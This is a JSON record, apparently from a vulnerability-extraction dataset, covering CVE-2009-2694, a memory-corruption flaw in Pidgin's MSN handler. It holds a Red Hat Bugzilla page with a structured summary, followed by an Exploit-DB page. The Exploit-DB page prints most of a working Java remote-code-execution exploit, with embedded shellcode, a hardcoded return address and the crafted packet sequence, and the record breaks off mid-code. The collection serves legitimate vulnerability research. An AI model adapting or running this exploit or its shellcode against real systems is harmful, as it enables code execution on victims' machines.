```
{
  "guidelines": "1. First verify if the content relates to the CVE specified based on the official description\n2. If the content does not relate to this CVE, respond with \"UNRELATED\"\n3. If no useful vulnerability information is found, respond with \"NOINFO\" \n4. For relevant content, extract:\n   - Root cause of vulnerability\n   - Weaknesses/vulnerabilities present\n   - Impact of exploitation\n   - Attack vectors\n   - Required attacker capabilities/position\n\nAdditional instructions:\n- Preserve original technical details and descriptions\n- Remove unrelated content\n- Translate non-English content to English\n- Note if the content provides more detail than the official CVE description",
  "response": [
    {
      "content": "=== Content from bugzilla.redhat.com_9b854090_20250126_104626.html ===\n\n\n* Login\n  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D514957)\n    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D514957)\n    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D514957)+ Login using a Red Hat Bugzilla account\n  + Forgot\u00a0Password\n  + [Create an Account](createaccount.cgi)\n\nRed Hat Bugzilla â€“ Bug\u00a0514957\n\n* [Home](./)\n* [New](enter_bug.cgi)\n* Search\n  + [Simple Search](query.cgi?format=specific)\n  + [Advanced Search](query.cgi?format=advanced)\n* My Links\n  + [Browse](describecomponents.cgi)\n  + [Requests](request.cgi)\n  + Reports\n  + Current State\n    - [Search](query.cgi)\n    - [Tabular reports](query.cgi?format=report-table)\n    - [Graphical reports](query.cgi?format=report-graph)\n    - [Duplicates](duplicates.cgi)\n  + Other Reports\n    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)\n  + Plotly Reports\n    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)\n    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)\n    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)\n* [Product Dashboard](page.cgi?id=productdashboard.html)\n\n- Help\n  * [Page Help!](docs/en/html/using/understanding.html)\n  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)\n  * [What's new](page.cgi?id=whats-new.html)\n  * [Browser Support Policy](https://access.redhat.com/help/browsers)\n  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)\n  * [FAQ](page.cgi?id=faq.html)\n  * [Guides index](docs/en/html/index.html)\n  * [User guide](docs/en/html/using/index.html)\n  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)\n  * [Contact](page.cgi?id=redhat/contact.html)\n  * [Legal](page.cgi?id=terms-conditions.html)\n- [[?]](page.cgi?id=quicksearch.html \"Quicksearch Help\")\n\nThis site requires JavaScript to be enabled to function correctly, please enable it.\n\n[**Bug\u00a0514957**](show_bug.cgi?id=514957)\n(CVE-2009-2694)\n- [CVE-2009-2694](https://access.redhat.com/security/cve/CVE-2009-2694) pidgin: insufficient input validation in msn\_slplink\_process\_msg()\n\n[Summary:](page.cgi?id=fields.html#short_desc \"The bug summary is a short sentence which succinctly describes what the bug is about.\")\nCVE-2009-2694 pidgin: insufficient input validation in msn\_slplink\_process\_msg()\n\n| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias \"A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.\") | CVE-2009-2694 | | [Product:](describecomponents.cgi \"Bugs are categorised into Products and Components. Select a Classification to narrow down this list.\") | Security Response | | [Classification:](page.cgi?id=fields.html#classification \"Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.\") | Other | | [Component:](describecomponents.cgi?product=Security Response \"Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.\") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components \"The sub component of a specific component\") | --- | | [Version:](page.cgi?id=fields.html#version \"The version field defines the version of the software the bug was found in.\") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform \"The hardware platform the bug was observed on. Note: When searching, selecting the option \\\"All\\\" only finds bugs whose value for this field is literally the word \\\"All\\\".\") | All | | [OS:](page.cgi?id=fields.html#op_sys \"The operating system the bug was observed on. Note: When searching, selecting the option \\\"All\\\" only finds bugs whose value for this field is literally the word \\\"All\\\".\") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | urgent | | [Severity:](page.cgi?id=fields.html#bug_severity) | urgent | | [Target Milestone:](page.cgi?id=fields.html#target_milestone \"The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.\") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to \"The person in charge of resolving the bug.\") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact \"The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.\") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact \"The person responsible for documenting once the bug has been resolved.\") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc \"Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.\") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard \"Each bug has a free-form single line text entry box for adding tags and status information.\") |  | | [Depends On:](page.cgi?id=fields.html#dependson \"The bugs listed here must be resolved before this bug can be resolved.\") | [515723](show_bug.cgi?id=515723) [515724](show_bug.cgi?id=515724) [515725](show_bug.cgi?id=515725) [515726](show_bug.cgi?id=515726) [515727](show_bug.cgi?id=515727) [833961](show_bug.cgi?id=833961) | | [Blocks:](page.cgi?id=fields.html#blocked \"This bug must be resolved before the bugs listed in this field can be resolved.\") |  | | TreeView+ | [depends on](buglist.cgi?bug_id=514957&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=514957&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2009-07-31 16:22 UTC by Tomas Hoger | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2021-02-25 12:50 UTC ([History](show_activity.cgi?id=514957)) | | [CC List:](page.cgi?id=fields.html#cclist) | 5 users (show)  bressers jlieskov kreilly rcvalle wtogami | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2009-08-24 07:32:28 UTC | | | Embargoed: |  | | |\n| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |\n| --- | | |\n\n| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2009:1218](https://access.redhat.com/errata/RHSA-2009%3A1218) | 0 | normal | SHIPPED_LIVE | Critical: pidgin security update | 2009-08-18 18:00:52 UTC | |  |\n| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | \n\n| [Description](show_bug.cgi?id=514957#c0)  Tomas Hoger    2009-07-31 16:22:16 UTC  ``` Core Security Technologies reported that previous upstream fixes addressing insufficient input validation flaw in pidgin / libpurple in function msn_slplink_process_msg() are inefficient and can be bypassed.  This flaw allows an attacker to overwrite pidgin's memory and possibly execute arbitrary code with the privileges of the user running application using libpurple.  This issue was previously tracked as [CVE-2008-2927](https://access.redhat.com/security/cve/CVE-2008-2927) ([bug #453764](show_bug.cgi?id=453764 \"CLOSED ERRATA - CVE-2008-2927 pidgin MSN integer overflow\")) and [CVE-2009-1376](https://access.redhat.com/security/cve/CVE-2009-1376) ([bug #500493](show_bug.cgi?id=500493 \"CLOSED ERRATA - CVE-2009-1376 pidgin incomplete fix for CVE-2008-2927\"), incomplete fix).   ```  [Comment 4](show_bug.cgi?id=514957#c4)  Tomas Hoger    2009-08-13 12:31:56 UTC  ``` Mitigation:  Users can lower the impact of this flaw by making sure their privacy settings only allow Pidgin to accept messages from the users on their buddy list.  This will prevent exploitation of this flaw by other random MSN users.   ```  [Comment 5](show_bug.cgi?id=514957#c5)  Tomas Hoger    2009-08-13 12:39:01 UTC  ``` Technically, this is not really an incomplete fix of the previous integer overflow issues, rather a new issue affecting same code part as previous issues.  In the new attack, attacker aims to exploit a NULL pointer dereference flaw.  This is achieved by sending message with non-0 offset.  When such message is processed in msn_slplink_process_msg(), msn_slplink_message_find() is called to find previous parts of the message sent within the same session.  With specially crafted previous messages, msn_slplink_message_find() may return a structure for ACK message, rather than request message, that later triggers NULL pointer dereference in:    memcpy(slpmsg->buffer + offset, data, len);  In ACK message, slpmsg->buffer is NULL and attacker supplied offset can be used to control what memory area will be overwritten.   ```  [Comment 7](show_bug.cgi?id=514957#c7)  Josh Bressers    2009-08-18 17:21:56 UTC  ``` This is now public: <http://developer.pidgin.im/viewmtn/revision/info/6f7343166c673bf0496ecb1afec9b633c1d54a0e>   ```  [Comment 8](show_bug.cgi?id=514957#c8)  errata-xmlrpc    2009-08-18 18:00:57 UTC  ``` This issue has been addressed in following products:    Red Hat Enterprise Linux 3   Red Hat Enterprise Linux 4   Red Hat Enterprise Linux 5  Via RHSA-2009:1218 <https://rhn.redhat.com/errata/RHSA-2009-1218.html>   ```  [Comment 9](show_bug.cgi?id=514957#c9)  Jan Lieskovsky    2009-08-21 08:58:49 UTC  ``` MITRE's [CVE-2009-2694](https://access.redhat.com/security/cve/CVE-2009-2694) record: -----------------------------  The msn_slplink_process_msg function in libpurple/protocols/msn/slplink.c in libpurple, as used in Pidgin (formerly Gaim) before 2.5.9 and Adium 1.3.5 and earlier, allows remote attackers to execute arbitrary code or cause a denial of service (memory corruption and application crash) by sending multiple crafted SLP (aka MSNSLP) messages to trigger an overwrite of an arbitrary memory location. NOTE: this issue reportedly exists because of an incomplete fix for [CVE-2009-1376](https://access.redhat.com/security/cve/CVE-2009-1376).  References: ----------- <http://www.coresecurity.com/content/libpurple-arbitrary-write> <http://developer.pidgin.im/viewmtn/revision/info/6f7343166c673bf0496ecb1afec9b633c1d54a0e> <http://developer.pidgin.im/wiki/ChangeLog> <http://www.pidgin.im/news/security/?id=34> <http://secunia.com/advisories/36384> <http://secunia.com/advisories/36392> <http://secunia.com/advisories/36401> <http://www.vupen.com/english/advisories/2009/2303>   ```  [Comment 10](show_bug.cgi?id=514957#c10)  Tomas Hoger    2009-08-24 07:32:28 UTC  ``` All current Fedora versions are now updated to 2.6.0+ too.   ``` |  |\n| --- | --- |\n\n---\n\n| Note You need to [log in](show_bug.cgi?id=514957&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |\n| --- |\n\n---\n\n[Privacy](page.cgi?id=redhat/privacy.html)\n[Contact](page.cgi?id=redhat/contact.html)\n[FAQ](page.cgi?id=faq.html)\n[Legal](page.cgi?id=terms-conditions.html)",
      "vulnerability_details": {
        "root_cause": "Insufficient input validation in the `msn_slplink_process_msg()` function within the libpurple library's MSN protocol handler.",
        "weaknesses": [
          "The vulnerability is a heap-based buffer overflow stemming from an incomplete fix of previous integer overflow issues (CVE-2008-2927 and CVE-2009-1376).",
          "A null pointer dereference flaw is exploited by sending a message with a non-zero offset.",
           "Specifically, `msn_slplink_message_find()` might return an ACK message structure instead of a request message structure, leading to a null `slpmsg->buffer` when `memcpy` is called."
        ],
        "impact": "Arbitrary code execution with the privileges of the user running the application. Memory corruption leading to a crash or denial of service.",
        "attack_vectors": "Sending crafted SLP (aka MSNSLP) messages via the MSN protocol. The attack involves sending two consecutive SLP packets.",
        "attacker_capabilities": "The attacker needs to be able to send messages to the victim via the MSN protocol. The exploit can be triggered by another random MSN user."
      }
    },
    {
      "content": "=== Content from www.exploit-db.com_674f7973_20250125_175517.html ===\n\n[![Exploit Database](/images/spider-white.png)](/)\n[Exploit Database](/)\n\n* [Exploits](/)\n* [GHDB](/google-hacking-database)\n* [Papers](/papers)\n* [Shellcodes](/shellcodes)\n\n---\n\n* [Search EDB](/search)\n* [SearchSploit Manual](/searchsploit)\n* [Submissions](/submit)\n\n---\n\n* [Online Training](https://www.offsec.com/)\n\n[![Exploit Database](/images/edb-logo.png)](/)\n\n* [Stats](/exploit-database-statistics)\n* [About Us](/)\n\n  [About Exploit-DB](/about-exploit-db)\n  [Exploit-DB History](/history)\n  [FAQ](/faq)\n* Search\n\n# Pidgin MSN 2.5.8 - Remote Code Execution\n\n#### EDB-ID:\n\n###### 9615\n\n#### CVE:\n\n###### [2009-2694](https://nvd.nist.gov/vuln/detail/CVE-2009-2694) [2009-1376](https://nvd.nist.gov/vuln/detail/CVE-2009-1376)\n\n---\n\n**EDB Verified:**\n\n#### Author:\n\n###### [Pierre Nogues](/?author=1830)\n\n#### Type:\n\n###### [remote](/?type=remote)\n\n---\n\n#### Platform:\n\n###### [Windows](/?platform=windows)\n\n#### Date:\n\n###### 2009-09-09\n\n---\n\n**Vulnerable App:**\n\n```\n/*\n* Pidgin MSN <= 2.5.8 Remote Code Execution\n*\n* Pierre Nogues - pierz@hotmail.it\n* http://www.indahax.com/\n*\n*\n* Description:\n*        Pidgin is a multi-protocol Instant Messenger.\n*\n*        This is an exploit for the vulnerability[1] discovered in Pidgin by core-security[2].\n*        The library \"libmsn\" used by pidgin doesn't handle specially crafted MsnSlp packets\n*        which could lead to memory corruption.\n*\n* Affected versions :\n*        Pidgin <= 2.5.8, Adium and other IM using Pidgin-libpurple/libmsn library.\n*\n* Plateforms :\n*        Windows, Linux, Mac\n*\n* Fix :\n*        Fixed in Pidgin 2.5.9\n*        Update to the latest version : http://www.pidgin.im/download/\n*\n* References :\n*        [1] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2694\n*        [2] http://www.coresecurity.com/content/libpurple-arbitrary-write\n*        [3] http://www.pidgin.im/news/security/?id=34\n*\n* Usage :\n*        You need the Java MSN Messenger library : http://sourceforge.net/projects/java-jml/\n*        javac.exe -cp \"%classpath%;.\\jml-1.0b3-full.jar\" PidginExploit.java\n*        java -cp \"%classpath%;.\\jml-1.0b3-full.jar\" PdiginExploit YOUR_MSN_EMAIL YOUR_PASSWORD TARGET_MSN_EMAIL\n*\n*/\n\nimport net.sf.jml.*;\nimport net.sf.jml.event.*;\nimport net.sf.jml.impl.*;\nimport net.sf.jml.message.p2p.*;\nimport net.sf.jml.util.*;\n\npublic class PidginExploit {\n\n   private MsnMessenger messenger;\n   private String login;\n   private String password;\n   private String target;\n\n   private int session_id = NumberUtils.getIntRandom();\n\n   private byte shellcode[] = new byte[] {\n\n           /*\n            * if you use the stack in your shellcode do not forgot to change esp because eip == esp == kaboom !\n            * sub esp,500\n            */\n               (byte) 0x81, (byte) 0xEC, (byte) 0x00, (byte) 0x05, (byte) 0x00, (byte) 0x00,\n\n           /*\n            * windows/exec - 121 bytes\n            * http://www.metasploit.com\n            * EXITFUNC=process, CMD=calc.exe\n            */\n               (byte) 0xfc, (byte) 0xe8, (byte) 0x44, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x8b, (byte) 0x45,\n               (byte) 0x3c, (byte) 0x8b, (byte) 0x7c, (byte) 0x05, (byte) 0x78, (byte) 0x01, (byte) 0xef, (byte) 0x8b,\n               (byte) 0x4f, (byte) 0x18, (byte) 0x8b, (byte) 0x5f, (byte) 0x20, (byte) 0x01, (byte) 0xeb, (byte) 0x49,\n               (byte) 0x8b, (byte) 0x34, (byte) 0x8b, (byte) 0x01, (byte) 0xee, (byte) 0x31, (byte) 0xc0, (byte) 0x99,\n               (byte) 0xac, (byte) 0x84, (byte) 0xc0, (byte) 0x74, (byte) 0x07, (byte) 0xc1, (byte) 0xca, (byte) 0x0d,\n               (byte) 0x01, (byte) 0xc2, (byte) 0xeb, (byte) 0xf4, (byte) 0x3b, (byte) 0x54, (byte) 0x24, (byte) 0x04,\n               (byte) 0x75, (byte) 0xe5, (byte) 0x8b, (byte) 0x5f, (byte) 0x24, (byte) 0x01, (byte) 0xeb, (byte) 0x66,\n               (byte) 0x8b, (byte) 0x0c, (byte) 0x4b, (byte) 0x8b, (byte) 0x5f, (byte) 0x1c, (byte) 0x01, (byte) 0xeb,\n               (byte) 0x8b, (byte) 0x1c, (byte) 0x8b, (byte) 0x01, (byte) 0xeb, (byte) 0x89, (byte) 0x5c, (byte) 0x24,\n               (byte) 0x04, (byte) 0xc3, (byte) 0x5f, (byte) 0x31, (byte) 0xf6, (byte) 0x60, (byte) 0x56, (byte) 0x64,\n               (byte) 0x8b, (byte) 0x46, (byte) 0x30, (byte) 0x8b, (byte) 0x40, (byte) 0x0c, (byte) 0x8b, (byte) 0x70,\n               (byte) 0x1c, (byte) 0xad, (byte) 0x8b, (byte) 0x68, (byte) 0x08, (byte) 0x89, (byte) 0xf8, (byte) 0x83,\n               (byte) 0xc0, (byte) 0x6a, (byte) 0x50, (byte) 0x68, (byte) 0x7e, (byte) 0xd8, (byte) 0xe2, (byte) 0x73,\n               (byte) 0x68, (byte) 0x98, (byte) 0xfe, (byte) 0x8a, (byte) 0x0e, (byte) 0x57, (byte) 0xff, (byte) 0xe7,\n               (byte) 0x63, (byte) 0x61, (byte) 0x6c, (byte) 0x63, (byte) 0x2e, (byte) 0x65, (byte) 0x78, (byte) 0x65,\n               (byte) 0x00\n           };\n\n   // reteip = pointer to the return address in the stack\n   // The shellcode will be wrote just before reteip\n   // and reteip will automaticly point to the shellcode. It's magic !\n   private int reteip = 0x0022CFCC;    //stack on XP SP3-FR Pidgin 2.5.8\n\n   private int neweip;\n   private byte[] payload = new byte[shellcode.length + 4];\n   private int totallength = reteip + 4;\n\n   public static void main(String[] args) throws Exception {\n\n       if(args.length != 3){\n           System.out.println(\"PidginExploit YOUR_MSN_EMAIL YOUR_PASSWORD TARGET_MSN_EMAIL\");\n       }else{\n           PidginExploit exploit = new PidginExploit(args[0],args[1],args[2]);\n           exploit.start();\n       }\n\n   }\n\n   public PidginExploit(String login, String password, String target){\n       this.login = login;\n       this.password = password;\n       this.target = target;\n\n       neweip = reteip - shellcode.length ;\n\n       for(int i=0;i<shellcode.length;i++)\n           payload[i] = shellcode[i];\n\n       payload[shellcode.length] = (byte)(neweip & 0x000000FF);\n       payload[shellcode.length + 1] = (byte)((neweip & 0x0000FF00) >> 8);\n       payload[shellcode.length + 2] = (byte)((neweip & 0x00FF0000) >> 16);\n       payload[shellcode.length + 3] = (byte)((neweip & 0xFF000000) >> 24);\n   }\n\n   public void start() {\n       messenger = MsnMessengerFactory.createMsnMessenger(login,password);\n       messenger.getOwner().setInitStatus(MsnUserStatus.ONLINE);\n\n       messenger.setLogIncoming(false);\n       messenger.setLogOutgoing(false);\n\n       initMessenger(messenger);\n       messenger.login();\n   }\n\n   protected void initMessenger(MsnMessenger messenger) {\n\n   messenger.addContactListListener(new MsnContactListAdapter() {\n\n           public void contactListInitCompleted(MsnMessenger messenger) {\n\n               final Object id = new Object();\n\n               messenger.addSwitchboardListener(new MsnSwitchboardAdapter() {\n\n                   public void switchboardStarted(MsnSwitchboard switchboard) {\n\n                       if (id != switchboard.getAttachment())\n                           return;\n\n                       switchboard.inviteContact(Email.parseStr(target));\n                   }\n\n                   public void contactJoinSwitchboard(MsnSwitchboard switchboard, MsnContact contact) {\n                       if (id != switchboard.getAttachment())\n                           return;\n\n                       MsnP2PSlpMessage msg = new MsnP2PSlpMessage();\n                       msg.setIdentifier(NumberUtils.getIntRandom());\n                       msg.setSessionId(session_id);\n                       msg.setOffset(0);\n                       msg.setTotalLength(totallength);\n                       msg.setCurrentLength(totallength);\n\n                       // This flag create a bogus MsnSlpPacket in pidgin memory with a buffer pointing to null\n                       // We'll use this buffer to rewrite memory in the stack\n                       msg.setFlag(0x1000020);\n\n                       msg.setP2PDest(target);\n\n                       switchboard.sendMessage(msg);\n\n                       System.out.println(\"First packet sent, waiting for the ACK\");\n\n                   }\n\n                   public void switchboardClosed(MsnSwitchboard switchboard) {\n                       System.out.println(\"switchboardClosed\");\n                       switchboard.getMessenger().removeSwitchboardListener(this);\n                   }\n\n                   public void contactLeaveSwitchboard(MsnSwitchboard switchboard, MsnContact contact){\n                       System.out.println(\"contactLeaveSwitchboard\");\n                   }\n               });\n               messenger.newSwitchboard(id);\n           }\n       });\n\n       messenger.addMessageListener(new MsnMessageAdapter(){\n\n           public void p2pMessageReceived(MsnSwitchboard switchboard,MsnP2PMessage message,MsnContact contact) {\n\n               //We receive the ACK of our first packet with the ID of the new bogus packet\n               message.getIdentifier();\n\n               MsnP2PDataMessage msg = new MsnP2PDataMessage(session_id, message.getIdentifier(), neweip,\n                       payload.length, payload, target);\n\n               switchboard.sendMessage(msg);\n               System.out.println(\"ACK received && Payload sent !\");\n               System.out.println(\"Exploit OK ! CTRL+C to quit\");\n\n           }\n       });\n\n       messenger.addMessengerListener(new MsnMessengerAdapter() {\n\n           public void loginCompleted(MsnMessenger messenger) {\n               System.out.println(messenger.getOwner().getEmail() + \" login\");\n           }\n\n           public void logout(MsnMessenger messenger) {\n               System.out.println(messenger.getOwner().getEmail() + \" logout\");\n